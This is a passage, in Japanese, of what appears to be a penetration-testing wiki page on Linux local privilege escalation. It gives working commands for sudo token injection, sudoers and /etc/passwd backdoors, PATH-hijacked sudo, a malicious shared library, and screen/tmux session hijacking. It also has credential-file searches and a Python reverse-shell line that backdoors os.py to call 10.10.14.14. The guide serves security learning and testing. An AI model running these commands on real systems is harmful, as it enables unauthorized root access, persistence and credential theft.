（`echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` を使用して `ptrace_scope` を一時的に有効化するか、`/etc/sysctl.d/10-ptrace.conf` を恒久的に変更して `kernel.yama.ptrace_scope = 0` に設定できます）

これらの requirements がすべて満たされている場合、[**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject) を使用して **privileges を escalate できます:**

- **first exploit**（`exploit.sh`）は、_/tmp_ に `activate_sudo_token` binary を作成します。これを使用して **session 内の sudo token を activate できます**（root shell は自動的に取得されないため、`sudo su` を実行します）:
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **second exploit**（`exploit_v2.sh`）は、_/tmp_ に **root 所有で setuid が設定された sh shell** を作成します。
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **3つ目のexploit**（`exploit_v3.sh`）は、**sudoトークンを永続化し、すべてのユーザーがsudoを使用できるようにするsudoersファイルを作成します**。
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

フォルダ、またはフォルダ内に作成されたファイルのいずれかに **write permissions** がある場合、[**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) binary を使用して、ユーザーと PID に対する **sudo token** を **create** できます。\
たとえば、ファイル _/var/run/sudo/ts/sampleuser_ を上書きでき、かつそのユーザーとして PID 1234 の **shell** を持っている場合、パスワードを知らなくても次の操作で **sudo privileges** を **obtain** できます。
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

`/etc/sudoers` ファイルと `/etc/sudoers.d` 内のファイルは、誰が `sudo` をどのように使用できるかを設定します。これらのファイルは、**デフォルトでは root ユーザーと root グループのみが読み取れます**。\
**このファイルを** **読み取る** ことができれば、**興味深い情報を入手できる可能性があり**、いずれかのファイルに **書き込む** ことができれば、**権限を昇格**できるようになります。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
書き込みが可能であれば、この権限を悪用できます
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
これらの権限を悪用する別の方法：
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

OpenBSD向けの`doas`など、`sudo`バイナリにはいくつかの代替手段があります。`/etc/doas.conf`の設定を確認することを忘れないでください。
```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```
`doas`でエディタまたはインタプリタが許可されている場合は、GTFOBins-style escapesを確認します：
```bash
doas vim
:!/bin/sh
```
### Sudo Hijacking

**ユーザーが通常マシンに接続し、権限昇格のために `sudo` を使用している**ことを知っており、そのユーザー context で shell を取得している場合、**root として自分のコードを実行した後、ユーザーのコマンドを実行する新しい sudo executable**を作成できます。次に、ユーザー context の **$PATH** を変更します（たとえば、`.bash_profile` に新しい path を追加します）。これにより、ユーザーが sudo を実行したときに、自分の sudo executable が実行されます。

ユーザーが別の shell（bash 以外）を使用している場合は、新しい path を追加するために別のファイルを変更する必要があります。たとえば、[sudo-piggyback](https://github.com/APTy/sudo-piggyback) は `~/.bashrc`、`~/.zshrc`、`~/.bash_profile` を変更します。[bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) にも別の例があります。

または、次のようなものを実行します。
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 共有ライブラリ

### ld.so

ファイル `/etc/ld.so.conf` は、**読み込まれる設定ファイルの場所**を示します。通常、このファイルには次のパスが含まれています: `include /etc/ld.so.conf.d/*.conf`

つまり、`/etc/ld.so.conf.d/*.conf` にある設定ファイルが読み込まれます。これらの設定ファイルは、**ライブラリが検索される****他のフォルダ**を示します。例えば、`/etc/ld.so.conf.d/libc.conf` の内容は `/usr/local/lib` です。**これは、システムが `/usr/local/lib` 内でライブラリを検索することを意味します**。

何らかの理由で、**ユーザーが**次のいずれかのパスに対する**書き込み権限を持っている**場合: `/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/` 内の任意のファイル、または `/etc/ld.so.conf.d/*.conf` 内の設定ファイルで指定された任意のフォルダ、そのユーザーは権限を昇格できる可能性があります。\
以下のページで、**この設定ミスを悪用する方法**を確認してください:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib を `/var/tmp/flag15/` にコピーすると、`RPATH` 変数で指定されているこの場所にあるプログラムによって使用されます。
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
次に、`gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` を使用して、`/var/tmp` に悪意のあるライブラリを作成します。
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities は、**利用可能な root 権限のサブセットをプロセスに提供**します。これにより、root の**権限がより小さく独立した単位に分割**されます。これらの各単位は、プロセスに個別に付与できます。この方法により、権限の全体セットが縮小され、exploit のリスクが低減します。\
以下のページを読んで、**capabilities とその abuse 方法について詳しく学んでください**:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## ディレクトリの権限

ディレクトリでは、**「execute」ビット**は、対象ユーザーがそのフォルダーに "**cd**" できることを意味します。\
**「read」ビット**はユーザーが**ファイル**を**一覧表示**できることを意味し、**「write」ビット**はユーザーが新しい**ファイル**を**削除**および**作成**できることを意味します。

## ACLs

Access Control Lists (ACLs) は、任意アクセス権限の第2層を表し、**従来の ugo/rwx 権限を上書きできます**。これらの権限により、所有者ではない、またはグループに所属していない特定のユーザーに対して、アクセス権を許可または拒否できるため、ファイルやディレクトリへのアクセスをより細かく制御できます。このレベルの**粒度により、より正確なアクセス管理が可能になります**。詳細については[**こちら**](https://linuxconfig.org/how-to-manage-acls-on-linux)をご覧ください。

ユーザー "kali" にファイルへの read および write 権限を**付与**します:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**システムから特定の ACL を持つファイルを取得**：
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### sudoers drop-in に隠された ACL backdoor

よくある misconfiguration は、`/etc/sudoers.d/` 内にある mode `440` の root 所有ファイルが、ACL によって low-priv user に書き込みアクセスを許可しているケースです。
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
`user:alice:rw-` のような記述がある場合、制限的なモードビットにもかかわらず、そのユーザーは sudo ルールを追加できます：
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
これは、`ls -l` のみのレビューでは見落としやすいため、影響の大きい ACL persistence/privesc パスです。

## Open shell sessions

**old versions** では、別のユーザー（**root**）の **shell** session を **hijack** できる場合があります。\
**newest versions** では、自分のユーザーの **screen** session にのみ **connect** できるようになっています。ただし、**session** 内に **interesting information** がないか確認できます。

### screen sessions hijacking

**List screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![screen sessions hijacking - Socket locations（システムによっては、一方がもう一方のシンボリックリンクとして公開されています）: ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**セッションにアタッチする**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

これは**古い tmux versions**における問題でした。非特権ユーザーとして、root によって作成された tmux（v2.1）session を hijack することはできませんでした。

**tmux sessions を一覧表示する**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![Socket locations（システムによっては、一方が他方の symlink として公開される） - tmux sessions hijacking: tmux -S /tmp/dev sess ls その socket を使用して一覧表示。その socket で tmux session を開始できます...](<../../images/image (837).png>)

**session に attachする**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
HTBのValentine boxを例として確認してください。

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

2006年9月から2008年5月13日までの間にDebianベースのシステム（Ubuntu、Kubuntuなど）で生成されたすべてのSSLおよびSSH keyは、このbugの影響を受けている可能性があります。\
このbugは、これらのOSで新しいSSH keyを作成する際に発生します。**可能な組み合わせが32,768通りしかなかった**ためです。つまり、すべての可能性を計算でき、**SSH public keyがあれば対応するprivate keyを検索できます**。計算済みの可能性は、こちらで確認できます：[https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** password authenticationを許可するかどうかを指定します。デフォルトは`no`です。
- **PubkeyAuthentication:** public key authenticationを許可するかどうかを指定します。デフォルトは`yes`です。
- **PermitEmptyPasswords**: password authenticationが許可されている場合に、空のpassword文字列を持つaccountへのloginをserverが許可するかどうかを指定します。デフォルトは`no`です。

### Login control files

これらのfileは、誰がloginできるか、またどのようにloginできるかに影響します。

- **`/etc/nologin`**: 存在する場合、root以外のloginをblockし、そのmessageを表示します。
- **`/etc/securetty`**: rootがloginできる場所を制限します（TTY allowlist）。
- **`/etc/motd`**: login後に表示されるbanner（environmentやmaintenanceの詳細をleakする可能性があります）。

### PermitRootLogin

rootがSSHを使用してloginできるかどうかを指定します。デフォルトは`no`です。指定可能な値は次のとおりです。

- `yes`: rootはpasswordとprivate keyを使用してloginできます
- `without-password`または`prohibit-password`: rootはprivate keyを使用した場合のみloginできます
- `forced-commands-only`: rootはprivate keyを使用し、commands optionsが指定されている場合にのみloginできます
- `no` : 不可

### AuthorizedKeysFile

user authenticationに使用できるpublic keyを含むfileを指定します。home directoryに置き換えられる`%h`のようなtokenを含めることができます。**absolute path**（`/`で始まる）または**userのhomeからのrelative path**を指定できます。例：
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
その設定により、**testusername** ユーザーの **private** key でログインしようとすると、ssh はその key の public key を `/home/testusername/.ssh/authorized_keys` および `/home/testusername/access` にあるものと比較します。

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding を使用すると、**key をサーバー上に残すことなく**（passphrase なしの key を含む）、ローカルの SSH key を**使用**できます。つまり、ssh で**ある host**へ**ジャンプ**し、そこから**最初の host**にある**key を使用して**別の host へ**ジャンプ**できます。

この option を `$HOME/.ssh.config` に次のように設定する必要があります：
```
Host example.com
ForwardAgent yes
```
`Host` が `*` の場合、ユーザーが別のマシンに移動するたびに、そのホストから keys にアクセスできることに注意してください（これは security issue です）。

ファイル `/etc/ssh_config` はこの **options** を **override** し、この設定を許可または拒否できます。\
ファイル `/etc/sshd_config` は、キーワード `AllowAgentForwarding` を使用して ssh-agent forwarding を **allow** または **denied** にできます（デフォルトは allow）。

環境内で Forward Agent が設定されていることがわかった場合は、以下のページを読んでください。**privileges を escalate するために abuse できる可能性があります**:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## Interesting Files

### Profiles files

ファイル `/etc/profile` と `/etc/profile.d/` 配下のファイルは、**ユーザーが新しい shell を実行したときに実行される scripts** です。したがって、これらのいずれかに対して **write または modify できる場合、privileges を escalate できます**。
```bash
ls -l /etc/profile /etc/profile.d/
```
奇妙な profile script が見つかった場合は、**機密情報**が含まれていないか確認してください。

### Passwd/Shadow Files

OS によっては、`/etc/passwd` および `/etc/shadow` ファイルの名前が異なっていたり、バックアップが存在したりする場合があります。そのため、**すべてを見つけ**、ファイルを**読み取れるか確認**して、ファイル内に**hashes があるか**確認することを推奨します。
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
場合によっては、`/etc/passwd`（または同等の）ファイル内に**password hashes**が存在することがあります
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 書き込み可能な /etc/passwd

まず、以下のいずれかのコマンドでパスワードを生成します。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
次に、ユーザー `hacker` を追加し、生成されたパスワードを設定します。
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
例: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

これで `hacker:hacker` を使って `su` コマンドを実行できます。

または、以下の行を使用して、パスワードなしのダミーユーザーを追加できます。\
警告: マシンの現在のセキュリティが低下する可能性があります。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
注: BSD プラットフォームでは、`/etc/passwd` は `/etc/pwd.db` および `/etc/master.passwd` に配置され、`/etc/shadow` は `/etc/spwd.db` に名前変更されています。

**機密ファイルに書き込みできるか**確認してください。例えば、**サービス設定ファイル**に書き込みできますか？
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
例えば、そのマシンで **tomcat** server が稼働しており、**/etc/systemd/ 内の Tomcat service configuration file を変更できる場合**、次の行を変更できます:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
次回 tomcat が起動されたときに backdoor が実行されます。

### フォルダを確認

以下のフォルダには、バックアップや興味深い情報が含まれている可能性があります：**/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root**（最後のフォルダはおそらく読み取れませんが、試してみてください）
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 不審な場所/所有ファイル
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 直近数分間に変更されたファイル
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DBファイル
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history、.sudo_as_admin_successful、profile、bashrc、httpd.conf、.plan、.htpasswd、.git-credentials、.rhosts、hosts.equiv、Dockerfile、docker-compose.yml ファイル
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 隠しファイル
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH 内の Script/Binaries**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web files**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **バックアップ**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### パスワードを含む既知のファイル

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) のコードを読むと、**パスワードを含んでいる可能性のある複数のファイル**を検索していることが分かります。\
これを行うために使用できる**もう1つの興味深いツール**が [**LaZagne**](https://github.com/AlessandroZ/LaZagne) です。これは、Windows、Linux、Macのローカルコンピューターに保存されている大量のパスワードを取得するために使用されるオープンソースアプリケーションです。

### ログ

ログを読み取れる場合、**ログ内から興味深い情報や機密情報を見つけられる可能性があります**。ログの内容が奇妙であるほど、より興味深い可能性があります。\
また、設定が "**不適切**" な（バックドアが仕込まれた？）**監査ログ**によって、この記事で説明されているように、監査ログ内に**パスワードを記録できる**場合があります: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/)。
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
**ログを読み取るために、グループ** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) **が非常に役立ちます。**

### シェルファイル
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

**password** という単語を**名前**または**内容**に含むファイルも確認し、ログ内の IP やメールアドレス、またはハッシュの regexps も確認してください。\
これらすべての方法をここで列挙するつもりはありませんが、興味があれば、[**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) が実行する最後のチェックを確認できます。

## Writable files

### Python library hijacking

Python script が**どこから**実行されるかを把握しており、そのフォルダー内に**書き込み可能**であるか、または**Python libraries を変更できる**場合、OS library を変更して backdoor を仕込むことができます（Python script の実行場所に書き込み可能な場合は、os.py library をコピーして貼り付けます）。

**library に backdoor を仕込む**には、os.py library の末尾に次の行を追加します（IP と PORT を変更してください）。
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

`logrotate`の脆弱性により、ログファイルまたはその親ディレクトリに対する**書き込み権限**を持つユーザーは、権限を昇格できる可能性があります。これは、通常**root**として実行される`logrotate`を操作して、特に _**/etc/bash_completion.d/**_ のようなディレクトリ内にある任意のファイルを実行させられる可能性があるためです。_ /var/log_ だけでなく、ログローテーションが適用されるすべてのディレクトリについても、権限を確認することが重要です。

> [!TIP]
> この脆弱性は`logrotate` version `3.18.0`以前に影響します

この脆弱性の詳細については、次のページを参照してください：[https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)。

[**logrotten**](https://github.com/whotwagner/logrotten)を使用してこの脆弱性をexploitできます。

この脆弱性は[**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)**と非常によく似ています。そのため、ログを変更できることがわかった場合は、常に誰がそのログを管理しているかを確認し、ログをsymlinkに置き換えることで権限を昇格できるか確認してください。

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

何らかの理由で、ユーザーが_/etc/sysconfig/network-scripts_に`ifcf-<whatever>`スクリプトを**書き込み**できる、または既存のスクリプトを**変更**できる場合、**system is pwned**です。

ネットワークスクリプトは、たとえば_ifcg-eth0_のように、ネットワーク接続に使用されます。これらは.INIファイルとまったく同じ形式に見えます。しかし、LinuxではNetwork Manager (dispatcher.d)によって~sourced~されます。

私の場合、これらのネットワークスクリプト内の`NAME=`属性は正しく処理されません。名前に**空白文字が含まれている場合、systemは空白文字より後の部分を実行しようとします**。つまり、**最初の空白文字以降のすべてがrootとして実行されます**。

例：_/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Network と /bin/id の間の空白に注意してください_)

### **init、init.d、systemd、rc.d**

`/etc/init.d` ディレクトリには、**classic Linux service management system** である System V init（SysVinit）用の **scripts** が格納されています。これには、サービスを `start`、`stop`、`restart`、場合によっては `reload` するための scripts が含まれています。これらは直接実行することも、`/etc/rc?.d/` にある symbolic links 経由で実行することもできます。Redhat systems では、別のパスとして `/etc/rc.d/init.d` も使用されます。

一方、`/etc/init` は、Ubuntu が導入した新しい **service management** である **Upstart** に関連付けられており、service management tasks に configuration files を使用します。Upstart への移行後も、Upstart の compatibility layer により、SysVinit scripts は Upstart configurations と併用されています。

**systemd** は、modern initialization and service manager として登場し、on-demand daemon starting、automount management、system state snapshots などの高度な機能を提供します。distribution packages 用のファイルを `/usr/lib/systemd/` に、administrator modifications 用のファイルを `/etc/systemd/system/` に整理することで、system administration process を効率化します。

## その他の Tricks

### NFS Privilege escalation


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### restricted Shells からの Escaping


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks は通常、syscall に hook して、userspace manager に privileged kernel functionality を公開します。manager authentication が弱い場合（例：FD-order に基づく signature checks や脆弱な password schemes）、local app が manager になりすまし、すでに root 化された devices 上で root へ privilege escalation できる可能性があります。詳細と exploitation details はこちらを参照してください。


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

VMware Tools/Aria Operations の regex-driven service discovery は、process command lines から binary path を抽出し、privileged context で `-v` を付けて実行できます。緩い patterns（例：`\S` の使用）は、writable locations（例：`/tmp/httpd`）に attacker-staged listeners をマッチさせる可能性があり、root としての execution につながります（CWE-426 Untrusted Search Path）。

詳細および他の discovery/monitoring stacks に適用可能な generalized pattern については、こちらを参照してください。

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## その他の help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Linux local privilege escalation vectors を探すための Best tool:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** linux と MAC の kernel vulns を Enumerate [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
